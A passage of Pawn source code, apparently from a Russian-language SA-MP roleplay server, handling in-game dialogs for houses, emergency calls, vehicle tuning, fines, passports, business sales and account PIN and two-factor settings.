								format(str1, sizeof(str1), fmt_string1,HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1]);
								strcat(stt,str1);
					        }
					    }
					    case 35:
					    {
					        if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1], "None", true)) strcat(stt,"№1 Заселить\n");
					        else
					        {
					   			static const fmt_string1[] = "%s\n";
								new str1[sizeof(fmt_string1)+32];
								format(str1, sizeof(str1), fmt_string1,HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1]);
								strcat(stt,str1);
					        }
					        if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel2], "None", true)) strcat(stt,"№2 Заселить\n");
					        else
					        {
					   			static const fmt_string1[] = "%s";
								new str1[sizeof(fmt_string1)+32];
								format(str1, sizeof(str1), fmt_string1,HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel2]);
								strcat(stt,str1);
					        }
					    }
					    case 45:
					    {
					        if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1], "None", true)) strcat(stt,"№1 Заселить\n");
					        else
					        {
					   			static const fmt_string1[] = "%s\n";
								new str1[sizeof(fmt_string1)+32];
								format(str1, sizeof(str1), fmt_string1,HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1]);
								strcat(stt,str1);
					        }
					        if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel2], "None", true)) strcat(stt,"№2 Заселить\n");
					        else
					        {
					   			static const fmt_string1[] = "%s\n";
								new str1[sizeof(fmt_string1)+32];
								format(str1, sizeof(str1), fmt_string1,HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel2]);
								strcat(stt,str1);
					        }
					        if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel3], "None", true)) strcat(stt,"№3 Заселить\n");
					        else
					        {
					   			static const fmt_string1[] = "%s";
								new str1[sizeof(fmt_string1)+32];
								format(str1, sizeof(str1), fmt_string1,HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel3]);
								strcat(stt,str1);
					        }
					    }
					    case 85:
					    {
					        if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1], "None", true)) strcat(stt,"№1 Заселить\n");
					        else
					        {
					   			static const fmt_string1[] = "%s\n";
								new str1[sizeof(fmt_string1)+32];
								format(str1, sizeof(str1), fmt_string1,HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel1]);
								strcat(stt,str1);
					        }
					        if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel2], "None", true)) strcat(stt,"№2 Заселить\n");
					        else
					        {
					   			static const fmt_string1[] = "%s\n";
								new str1[sizeof(fmt_string1)+32];
								format(str1, sizeof(str1), fmt_string1,HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel2]);
								strcat(stt,str1);
					        }
					        if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel3], "None", true)) strcat(stt,"№3 Заселить\n");
					        else
					        {
					   			static const fmt_string1[] = "%s\n";
								new str1[sizeof(fmt_string1)+32];
								format(str1, sizeof(str1), fmt_string1,HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel3]);
								strcat(stt,str1);
					        }
					        if(!strcmp(HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel4], "None", true)) strcat(stt,"№4 Заселить\n");
					        else
					        {
					   			static const fmt_string1[] = "%s";
								new str1[sizeof(fmt_string1)+32];
								format(str1, sizeof(str1), fmt_string1,HInfo[GetPVarInt(playerid,"PlayerHouse")][hZasel4]);
								strcat(stt,str1);
					        }
					    }
					}
					ShowPlayerDialog(playerid,314,DIALOG_STYLE_LIST,"Управление домом",stt,"Далее","Назад");
				}
				case 3: ShowHouseUl(playerid);
				case 4: cmd_sellhousegos(playerid);
				case 5: ShowPlayerDialog(playerid,372,DIALOG_STYLE_INPUT,"Продать дом игроку","{ffffff}Введите ID игрока и цену через запятую!\n\nНапример: 53,100000","Далее","Отмена");
				case 6: SetPVarInt(playerid,"Obm",1), ShowPlayerDialog(playerid,372,DIALOG_STYLE_INPUT,"Обменяться домами с игроком","{ffffff}Введите ID игрока и доплату через запятую!\n\nНапример: 53,100000","Далее","Отмена");
		    }
		}
		case 117:
		{
		    if(!response) return cmd_house(playerid,"");
		   	new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,117,DIALOG_STYLE_INPUT,"Заселение","{FFFFFF}Введите ID, которого хотите подселить:" ,"Далее","Назад");
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(krek,x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
			{
				SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
				ShowPlayerDialog(playerid,117,DIALOG_STYLE_INPUT,"Заселение","{FFFFFF}Введите ID, которого хотите подселить:" ,"Далее","Назад");
				return true;
			}
   			if(GetPlayerHouse(krek) || GetPlayerKom(krek))
			{
				SendClientMessage(playerid,CGREY,"Игрок имеет жильё");
				ShowPlayerDialog(playerid,117,DIALOG_STYLE_INPUT,"Заселение","{FFFFFF}Введите ID, которого хотите подселить:" ,"Далее","Назад");
				return true;
			}
			if(GetPred(krek) == 1)
			{
				SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
				ShowPlayerDialog(playerid,117,DIALOG_STYLE_INPUT,"Заселение","{FFFFFF}Введите ID, которого хотите подселить:" ,"Далее","Назад");
				return true;
			}
			SendClientMessage(playerid,CREWARD,"Вы предложили игроку подселиться к Вам");
		   	static const fmt_string1[] = "%s предложил Вам подселиться к нему в дом";
			new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
			SendClientMessage(krek,0xFF7F50FF,str1);
			SendClientMessage(krek,CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(krek,"Podsel",1);
			SetPVarInt(krek,"Zasel",GetPVarInt(playerid,"Zasel"));
			SetPVarInt(krek,"PodselID",playerid);
		}
		
		case 123:
		{
		    if(!response) return DeletePVar(playerid,"Budka");
			if(GetPVarInt(playerid,"Budka"))
			{
			    listitem = listitem+2;
			    GiveMoney(playerid,-25);
			    DeletePVar(playerid,"Budka");
			}
            if(listitem == 0 || listitem == 1)
			{
			    SetPVarInt(playerid,"Viz",listitem+1);
				ShowPlayerDialog(playerid,124,DIALOG_STYLE_INPUT,"Экстренный вызов","{FFFFFF}Опишите что случилось:","Далее","Назад");
			}
			else
			{
			    switch(listitem)
		    	{
				    case 2:
			        {
			            SetPVarInt(playerid,"GoViz",3);
	   					static const fmt_string1[] = "[J] %s[%d] вызывает такси | Принять вызов: /tc";
						new str1[sizeof(fmt_string1)+32];
						format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid);
						for(new i = 0; i < MAX_PLAYERS; i++)
						{
						    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
							if(GetPVarInt(i,"Taxist") > 0) SendClientMessage(i,COLOR_SKLAD,str1);
						}
			        }
			        case 3:
			        {
			            SetPVarInt(playerid,"GoViz",4);
	   					static const fmt_string1[] = "[J] %s[%d] вызывает механика | Принять вызов: /tc";
						new str1[sizeof(fmt_string1)+32];
						format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid);
						for(new i = 0; i < MAX_PLAYERS; i++)
						{
						    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
							if(GetPVarInt(i,"Meh") > 0) SendClientMessage(i,COLOR_SKLAD,str1);
						}
			        }
		        }
		        SendClientMessage(playerid,-1,"Ваш вызов принят ожидайте ответа");
			}
		}
		case 124:
		{
		    if(!response)
			{
				if(GetPVarInt(playerid,"Budka")) ShowPlayerDialog(playerid,123,DIALOG_STYLE_LIST,"Телефонная будка","{FFFFFF}1 | Такси\n2 | Механик","Далее","Назад");
				else ShowPlayerDialog(playerid,123,DIALOG_STYLE_LIST,"Экстренный вызов","{FFFFFF}1 | Полиция\n2 | Скорая помощь\n3 | Такси\n4 | Механик","Далее","Назад");
				return 1;
			}
   			new krek[100];
		    if(sscanf(inputtext,"s[100]",krek)) return ShowPlayerDialog(playerid,124,DIALOG_STYLE_INPUT,"Экстренный вызов","{FFFFFF}Опишите что случилось:","Далее","Назад");
		    switch(GetPVarInt(playerid,"Viz"))
		    {
		        case 1:
		        {
		            SetPVarInt(playerid,"GoViz",1);
   					static const fmt_string1[] = "[R] %s[%d] вызывает полицию. Проишествие: %s | Принять вызов: /tc";
					new str1[sizeof(fmt_string1)+32+100];
					format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid,krek);
					SendCopsMessage(str1);
		        }
		        case 2:
		        {
		            SetPVarInt(playerid,"GoViz",2);
   					static const fmt_string1[] = "[R] %s[%d] вызывает скорую помощь. Проишествие: %s | Принять вызов: /tc";
					new str1[sizeof(fmt_string1)+32+100];
					format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid,krek);
					SendFMes(F_HOSPITAL_LS,COLOR_SKLAD,str1);
		        }
		    }
		    SendClientMessage(playerid,-1,"Ваш вызов принят ожидайте ответа");
		}
		case 125:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"CHid");
		        DeletePVar(playerid,"CHcena");
		        return true;
		    }
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"CHid"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z)) return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			if(GetPlayerHouse(GetPVarInt(playerid,"CHid"))) return SendClientMessage(playerid,CGREY,"У Игрока есть дом");
			if(GetPred(GetPVarInt(playerid,"CHid")) == 1) return SendClientMessage(playerid,CGREY,"Игроку уже кто-то что-то предложил");
	    	SendClientMessage(playerid,CREWARD,"Вы предложили игроку купить дом");
   			static const fmt_string1[] = "%s предложил Вам купить дом. Цена: $%i";
			new str1[sizeof(fmt_string1)+32+10+32];
			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"CHcena"));
			SendClientMessage(GetPVarInt(playerid,"CHid"),0xFF7F50FF,str1);
			SendClientMessage(GetPVarInt(playerid,"CHid"),CWHITE,"Для согласия нажмите{FF7F50} [Y]{FFFFFF} ,для отказа нажмите {FF7F50}[N]");
			SetPVarInt(GetPVarInt(playerid,"CHid"),"ChomeID1",playerid);
			SetPVarInt(GetPVarInt(playerid,"CHid"),"ChomeCena1",GetPVarInt(playerid,"CHcena"));
			DeletePVar(playerid,"CHid");
			DeletePVar(playerid,"CHcena");
		}
		case 126:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"ChomeID1");
		        DeletePVar(playerid,"ChomeCena1");
		        return true;
		    }
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(GetPVarInt(playerid,"ChomeID1"),x,y,z);
		    if(!IsPlayerInRangeOfPoint(playerid, 5.0, x,y,z))
			{
   				DeletePVar(playerid,"ChomeID1");
		        DeletePVar(playerid,"ChomeCena1");
				return SendClientMessage(playerid,CGREY,"Вы не рядом с игроком");
			}
			if(GetPlayerHouse(playerid))
			{
   				DeletePVar(playerid,"ChomeID1");
		        DeletePVar(playerid,"ChomeCena1");
				return SendClientMessage(playerid,CGREY,"У Вас есть дом");
			}
			if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"ChomeCena1"))
			{
   				DeletePVar(playerid,"ChomeID1");
		        DeletePVar(playerid,"ChomeCena1");
				return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			}
			strmid(HInfo[GetPVarInt(GetPVarInt(playerid,"ChomeID1"),"PlayerHouse")][hOwner], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), 32);
            query = "";
			format(query, sizeof(query), "UPDATE testhouse SET hOwner = '%s' WHERE id = '%d' LIMIT 1",PlayerInfo[playerid][pSendername], GetPVarInt(GetPVarInt(playerid,"ChomeID1"),"PlayerHouse"));
			mysql_tquery(mysql,query);
			SendClientMessage(playerid,CREWARD,"Вы купили дом у игрока");
			SendClientMessage(GetPVarInt(playerid,"ChomeID1"),CREWARD,"Вы продали дом игроку");
			SetPVarInt(playerid,"PlayerHouse",GetPVarInt(GetPVarInt(playerid,"ChomeID1"),"PlayerHouse"));
			GiveMoney(playerid,-GetPVarInt(playerid,"ChomeCena1"));
			GiveMoney(GetPVarInt(playerid,"ChomeID1"),GetPVarInt(playerid,"ChomeCena1"));
			query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Купил дом №%d у %s (-%d$)','%d')",PlayerInfo[playerid][pID],GetPVarInt(GetPVarInt(playerid,"ChomeID1"),"PlayerHouse"),PlayerInfo[GetPVarInt(playerid,"ChomeID1")][pSendername],GetPVarInt(playerid,"ChomeCena1"),gettime());
			mysql_tquery(mysql,query);
			query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Продал дом №%d %s (+%d$)','%d')",PlayerInfo[GetPVarInt(playerid,"ChomeID1")][pID],GetPVarInt(GetPVarInt(playerid,"ChomeID1"),"PlayerHouse"),PlayerInfo[playerid][pSendername],GetPVarInt(playerid,"ChomeCena1"),gettime());
			mysql_tquery(mysql,query);
			
			DeletePVar(GetPVarInt(playerid,"ChomeID1"),"PlayerHouse");
			DeletePVar(playerid,"ChomeCena1");
			DeletePVar(playerid,"ChomeID1");
		}
		case 127:
		{
		    if(!response) return true;
			GoAnim(playerid,listitem+1);
		}
		case 128:
		{
		    if(!response)
		    {
		        RemoveVehicleComponent(GetPlayerVehicleID(playerid), GetPVarInt(playerid,"STODet"));
		        
				new kek = 0;
				for(new i1 = 1; i1 <= TOTALV; i1++)
				{
				    if(VInfo[i1][vcar] == INVALID_VEHICLE_ID) continue;
					if(GetPlayerVehicleID(playerid) == VInfo[i1][vcar]) kek = i1;
				}
                SetTuning(GetPlayerVehicleID(playerid),kek);
                DeletePVar(playerid,"STODet");
                DeletePVar(playerid,"STOPrice");
                SetPlayerCameraLookAt(playerid,-5.168276,-9.959818,2000.713623);
				SetPlayerCameraPos(playerid,-6.021756,-10.442592,2000.909790);
               // ShowTuning(playerid);
		        return true;
		    }
		    if(GetPVarInt(playerid,"ATune") == 0)
			{
			    if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"STOPrice"))
			    {
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
	                RemoveVehicleComponent(GetPlayerVehicleID(playerid),GetPVarInt(playerid,"STODet"));
	                DeletePVar(playerid,"STODet");
	                DeletePVar(playerid,"STOPrice");
	                SetPlayerCameraLookAt(playerid,-5.168276,-9.959818,2000.713623);
					SetPlayerCameraPos(playerid,-6.021756,-10.442592,2000.909790);
	              //  ShowTuning(playerid);
			        return true;
			    }
			    SaveVehicleTuning(playerid);
		    }
		    GiveMoney(playerid,-GetPVarInt(playerid,"STOPrice"));
		    SendClientMessage(playerid,-1,"Вы приобрели данную деталь");
			SetPlayerCameraLookAt(playerid,-5.168276,-9.959818,2000.713623);
			SetPlayerCameraPos(playerid,-6.021756,-10.442592,2000.909790);
		//	ShowTuning(playerid);
			DeletePVar(playerid,"STODet");
			DeletePVar(playerid,"STOPrice");
		}
		case 129:
		{
		    if(!response)
		    {
		        new kek = 0;
				for(new i1 = 1; i1 <= TOTALV; i1++)
				{
				    if(VInfo[i1][vcar] == INVALID_VEHICLE_ID) continue;
					if(GetPlayerVehicleID(playerid) == VInfo[i1][vcar]) kek = i1;
				}
                ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),VInfo[kek][vsvet]);
                DeletePVar(playerid,"STODet");
                DeletePVar(playerid,"STOPrice");
               // ShowTuning(playerid);
		        return true;
		    }
		    if(GetPVarInt(playerid,"ATune") == 0)
			{
			    if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"STOPrice"))
			    {
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        new kek = 0;
					for(new i1 = 1; i1 <= TOTALV; i1++)
					{
					    if(VInfo[i1][vcar] == INVALID_VEHICLE_ID) continue;
						if(GetPlayerVehicleID(playerid) == VInfo[i1][vcar]) kek = i1;
					}
	                ChangeVehiclePaintjob(GetPlayerVehicleID(playerid),VInfo[kek][vsvet]);
	                DeletePVar(playerid,"STODet");
	                DeletePVar(playerid,"STOPrice");
			        return true;
			    }
			    GiveMoney(playerid,-GetPVarInt(playerid,"STOPrice"));
				new kek = 0;
				for(new i1 = 1; i1 <= TOTALV; i1++)
				{
				    if(VInfo[i1][vcar] == INVALID_VEHICLE_ID) continue;
					if(GetPlayerVehicleID(playerid) == VInfo[i1][vcar]) kek = i1;
				}
				VInfo[kek][vsvet] = GetPVarInt(playerid,"STODet");
				query = "";
		 		format(query,sizeof(query),"UPDATE `veh` SET `svet` = '%d' WHERE id = '%d' LIMIT 1",VInfo[kek][vsvet],VInfo[kek][id]);
				mysql_tquery(mysql,query);
			}
		//	ShowTuning(playerid);
			SendClientMessage(playerid,-1,"Вы установили данный винил");
			DeletePVar(playerid,"STODet");
			DeletePVar(playerid,"STOPrice");
		    
		}
		case 130:
		{
		    if(!response) return 1;
			new color[2];
			if(sscanf(inputtext, "p<,>ii",color[0], color[1])) return ShowPlayerDialog(playerid,130,DIALOG_STYLE_INPUT,"Цвет","{FFFFFF}Введите желаемый цвет авто через запятую\nПример: 3,3","Далее","Назад");
			if(color[0] < 0 || color[0] > 252)
			{
				ShowPlayerDialog(playerid,130,DIALOG_STYLE_INPUT,"Цвет","{FFFFFF}Введите желаемый цвет авто через запятую\nПример: 3,3","Далее","Назад");
				return SendClientMessage(playerid, CGREY, "ID цвета от 0 до 252!");
			}
			if(color[1] < 0 || color[1] > 252)
			{
				ShowPlayerDialog(playerid,130,DIALOG_STYLE_INPUT,"Цвет","{FFFFFF}Введите желаемый цвет авто через запятую\nПример: 3,3","Далее","Назад");
				return SendClientMessage(playerid, CGREY, "ID цвета от 0 до 252!");
			}
			SetPVarInt(playerid,"Color1",color[0]);
			SetPVarInt(playerid,"Color2",color[1]);
			ChangeVehicleColor(GetPlayerVehicleID(playerid), color[0], color[1]);
			ShowPlayerDialog(playerid,131,DIALOG_STYLE_MSGBOX,"Цвет","{FFFFFF}Вы хотите перекрасить авто в данный цвет?\nЦена: $3000","Да","Нет");
		}
		case 131:
		{
			new kek = 0;
			for(new i1 = 1; i1 <= TOTALV; i1++)
			{
			    if(VInfo[i1][vcar] == INVALID_VEHICLE_ID) continue;
				if(GetPlayerVehicleID(playerid) == VInfo[i1][vcar]) kek = i1;
			}
		    if(!response)
			{
				ChangeVehicleColor(GetPlayerVehicleID(playerid), VInfo[kek][vcolor1], VInfo[kek][vcolor2]);
                DeletePVar(playerid,"Color1");
                DeletePVar(playerid,"Color2");
		        return true;
			}
			if(GetPVarInt(playerid,"ATune") == 0)
			{
		    	if(PlayerInfo[playerid][pCash] < 10000)
			    {
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
	                ChangeVehicleColor(GetPlayerVehicleID(playerid), VInfo[kek][vcolor1], VInfo[kek][vcolor2]);
	                DeletePVar(playerid,"Color1");
	                DeletePVar(playerid,"Color2");
	                //ShowTuning(playerid);
			        return true;
			    }
			    GiveMoney(playerid,-10000);
				VInfo[kek][vcolor1] = GetPVarInt(playerid,"Color1");
				VInfo[kek][vcolor2] = GetPVarInt(playerid,"Color2");
				query = "";
		 		format(query,sizeof(query),"UPDATE `veh` SET `color1` = '%d',`color2` = '%d' WHERE id = '%d' LIMIT 1",VInfo[kek][vcolor1],VInfo[kek][vcolor2],VInfo[kek][id]);
				mysql_tquery(mysql,query);
			}
			//ShowTuning(playerid);
			SendClientMessage(playerid,-1,"Вы установили данный цвет");
			DeletePVar(playerid,"Color1");
			DeletePVar(playerid,"Color2");
		}
		case 132:
		{
		    if(!response) return 1;
		    if(PlayerInfo[playerid][pCash] < 10000) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
            RemoveVehicleComponent(GetPlayerVehicleID(playerid), 1087);
            SendClientMessage(playerid,-1,"Вы удалили гидравлику с авто");
          //  ShowTuning(playerid);
            SaveVehicleTuning(playerid);
		}
		case 133:
		{
		    if(!response) return true;
		    if(PlayerInfo[playerid][pCash] < PlayerInfo[playerid][pShtrav]) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
		    GiveMoney(playerid,-PlayerInfo[playerid][pShtrav]);
		/*    for(new i = 1; i<= TOTALV; i++)
			{
			    if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
				if(strcmp(VInfo[i][vname], PlayerInfo[playerid][pSendername], true) == 0 && VInfo[i][vtick] > 0)
			    {
                    VInfo[i][vtick] = 0;
                    query = "";
			 		format(query,sizeof(query),"UPDATE `veh` SET `tick` = '0' WHERE id = '%d' LIMIT 1",VInfo[i][id]);
					mysql_tquery(mysql,query);
			    }
		    }*/
		    PlayerInfo[playerid][pShtrav] = 0;
		    PlayerInfo[playerid][pShtravTick] = 0;
		    Kazna += PlayerInfo[playerid][pShtrav];
		    SetMatsInt("kazna",Kazna);
	    	ApplyDynamicActorAnimation(PoliceBot[GetBotPD(playerid)],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(PoliceText[GetBotPD(playerid)],-1,"Вы оплатили все штрафы");
			SetTimerEx("ClearBotGlobal", 3000, false,"dd",PoliceBot[GetBotPD(playerid)],_:PoliceText[GetBotPD(playerid)]);
		}
		case 135:
		{
		    if(!response) return true;
			new text[32];
			if(sscanf(inputtext, "s[32]",text)) return ShowPlayerDialog(playerid,135,DIALOG_STYLE_INPUT,"Получение паспорта","{FFFFFF}Введите  Вашу Имя и Фамилию в формате Имя_Фамилия\nПример: Ivan_Ivanov","Далее","Отмена");
			if(!strcmp(text,PlayerInfo[playerid][pSendername],true))
			{
				if(GetFree(playerid,441,1)) return SendClientMessage(playerid,CGREY,"Недостаточно места в иннвентаре!");
				GiveInv(playerid,441,1);
				PlayerInfo[playerid][pPass] = 1;
				new st[20];
				format(st,sizeof(st),"%s%s%i%i%i%i%i",GeneratePassword(),GeneratePassword(),random(9),random(9),random(9),random(9),random(9));
				strmid(PlayerInfo[playerid][pNumPass], st, 0, strlen(st), 20);
				SendClientMessage(playerid,-1,"Вам выдали паспорт. Показать паспорт: {f7ae11}/pass");
				CheckQuest(playerid,0);
				if(PlayerInfo[playerid][pHelp] == 1)
				{
					SendClientMessage(playerid,CREWARD,"[Помощник]{ffffff} Для более прибыльных работ тебе понадобятся права на автотранспорт. Для их оформления нужно 750$");
					SendClientMessage(playerid,CREWARD,"[Помощник]{ffffff} Используй: /gps » Работы » Добыча песка / Грузчики / Повар / Сборщик аптечек.");
					PlayerInfo[playerid][pHelp] = 2;
                    
				}
			}
			else ShowPlayerDialog(playerid,135,DIALOG_STYLE_INPUT,"Получение паспорта","{FFFFFF}Введите  Вашу Имя и Фамилию в формате Имя_Фамилия\nПример: Ivan_Ivanov","Далее","Отмена");
		}
		case 136:
		{
		    if(!response) return true;
		    if(GetPlayerBiz(playerid))
		    {
		        GiveMoney(playerid,(PlayerInfo[playerid][pVip] > gettime()) ? (GetProcent(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice],1)) : (GetProcent(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice])));
		        BizInfo[GetPVarInt(playerid,"PlayerBiz")][bLock] = 0;
		        strmid( BizInfo[GetPVarInt(playerid,"PlayerBiz")][bOwner], "None", 0, strlen("None"), 32);
		        query = "";
				format(query, sizeof(query), "UPDATE `biz` SET `owner` = 'None',`lock` = 0 WHERE `id` = '%d' LIMIT 1", GetPVarInt(playerid,"PlayerBiz"));
				mysql_tquery(mysql,query);
				query = "";
				format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Продал бизнес №%d в гос. (+%d$)','%d')",PlayerInfo[playerid][pID],GetPVarInt(playerid,"PlayerBiz"),(PlayerInfo[playerid][pVip] > gettime()) ? (GetProcent(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice],1)) : (GetProcent(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bPrice])),gettime());
				mysql_tquery(mysql,query);
				UpdateBiz(GetPVarInt(playerid,"PlayerBiz"));
				DeletePVar(playerid,"PlayerBiz");
				
				SendClientMessage(playerid,CREWARD,"Вы продали бизнес государству");
		    }
		    else SendClientMessage(playerid,CGREY,"Вы не владеете бизнесом!");
		}
		case 137:
		{
		    if(!response) return cmd_menu(playerid,"");
			switch(listitem)
			{
			    case 0:
			    {
				    switch(PlayerInfo[playerid][pPin1])
				    {
				        case 0:
				        {
				            if(PlayerInfo[playerid][pPin] == 0)
				            {
				                SendClientMessage(playerid,CGREY,"У Вас не установлен PIN-CODE");
				                cmd_menu(playerid,"");
				                return true;
				            }
				            PlayerInfo[playerid][pPin1] = 1;
				            SendClientMessage(playerid,CLIGHTRED,"Вы включили PIN-CODE");
				            query = "";
							format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Включил PIN-CODE','%d')",PlayerInfo[playerid][pID],gettime());
							mysql_tquery(mysql,query);
				        }
						default:
						{
						    SetPVarInt(playerid,"PinCodeVkl",1);
						    SendClientMessage(playerid,CLIGHTRED,"Введите PIN-CODE в чат для отключения. Видеть его никто не будет");
						    
						}
				    }
			    }
			    case 1:
			    {
				    switch(PlayerInfo[playerid][pPin])
				    {
				        case 0:
				        {
							SetPVarInt(playerid,"PinCodeUst",1);
				            SendClientMessage(playerid,CLIGHTRED,"Введите PIN-CODE в чат для установки его. Видеть его никто не будет");
				            SendClientMessage(playerid,CLIGHTRED,"PIN-CODE может состоять только из цифр!");
				        }
						default:
						{
						    SetPVarInt(playerid,"PinCodeSmen",1);
						    SendClientMessage(playerid,CLIGHTRED,"Введите нынешний PIN-CODE в чат для смены. Видеть его никто не будет");
						    SendClientMessage(playerid,CLIGHTRED,"PIN-CODE может состоять только из цифр!");
						}
				    }
			    }
			    case 2:
			    {
					switch(PlayerInfo[playerid][pGA])
				    {
				        case 0:
				        {
							ShowPlayerDialog(playerid,263,DIALOG_STYLE_MSGBOX,"Включить двухэтапную авторизацию","{FFFFFF}Если Вы хотите подключить двухэтапную авторизацию, Вам потребуется смартфон.\nНа этот смартфон потребуется скачать приложение {f7ae11}'Google Authenticator'.","Далее","Назад");
				        }
						default:
						{
						    ShowPlayerDialog(playerid,263,DIALOG_STYLE_MSGBOX,"Отключить двухэтапную авторизацию","{FFFFFF}Вы действительно хотите отключить двухэтапную авторизацию?\nЭто может подвергнуть Ваш аккаунт взлому.","Далее","Назад");
						}
				    }
			    }
			    case 3:
			    {
					switch(PlayerInfo[playerid][pVKStatus])
				    {
				        case 0:
				        {
							ShowPlayerDialog(playerid,263,DIALOG_STYLE_MSGBOX,"Включить двухэтапную авторизацию","{FFFFFF}Если Вы хотите подключить двухэтапную авторизацию, Вам потребуется смартфон.\nНа этот смартфон потребуется скачать приложение {f7ae11}'Google Authenticator'.","Далее","Назад");
				        }
						default:
						{
						    ShowPlayerDialog(playerid,263,DIALOG_STYLE_MSGBOX,"Отключить двухэтапную авторизацию","{FFFFFF}Вы действительно хотите отключить двухэтапную авторизацию?\nЭто может подвергнуть Ваш аккаунт взлому.","Далее","Назад");
						}
				    }
			    }
			}
		}
		case 139:
		{
			if(!response) return cmd_menu(playerid,"");
			switch(listitem+1)
			{
				//case 0: ShowPlayerDialog(playerid,140,DIALOG_STYLE_INPUT,"Ввести донат-код","{FFFFFF}Введите донат-код:","Далее","Назад");
				case 1: ShowPlayerDialog(playerid,142,DIALOG_STYLE_INPUT,"Обменять игровую валюту","{FFFFFF}Введите сколько хотите обменять доната:\nКурс: {f7ae11}1 Donate Point - $300","Далее","Назад");
				case 2:
				{
				    if(PlayerInfo[playerid][pWarn] == 0) return SendClientMessage(playerid,CGREY,"У Вас нет предупреждений");
				    if(PlayerInfo[playerid][pDonate] < 35)
				    {
				       	SendClientMessage(playerid,CGREY,"Недостаточно доната на счету");
				       	cmd_menu(playerid,"");
				        return true;
				    }
				    PlayerInfo[playerid][pDonate] -= 35;
					PlayerInfo[playerid][pWarn]--;
					if(PlayerInfo[playerid][pWarn] > 0)
				    {
				        new days,mon,yer;
				        getdate(yer,mon,days);
					    PlayerInfo[playerid][pWarnSkok] = gettime() +7*86400;
				    }
				    else PlayerInfo[playerid][pWarnSkok] = 0;
					SendClientMessage(playerid,CREWARD,"Вы сняли 1 предупреждение");
				}
			//	case 2:	ShowPlayerDialog(playerid, 304, DIALOG_STYLE_LIST, "Выберите оружие", "{FFFFFF}Silenced 9mm\nDesert Eagle\nShotGun\nMP5\nAK47\nM4", "Выбрать", "Отмена");
				case 3:
				{
				    if(PlayerInfo[playerid][pDonate] < 5)
				    {
				       	SendClientMessage(playerid,CGREY,"Недостаточно доната на счету");
				       	cmd_menu(playerid,"");
				        return true;
				    }
				    ShowPlayerDialog(playerid, 207, DIALOG_STYLE_INPUT, "Смена ника", "{FFFFFF}Введите желаемый ник в окошко:\n{f7ae11}Внимание!{FFFFFF}\nНик должен быть не больше 32 символов\nИ иметь форму Имя_Фамилия", "Готово","Назад");
				}
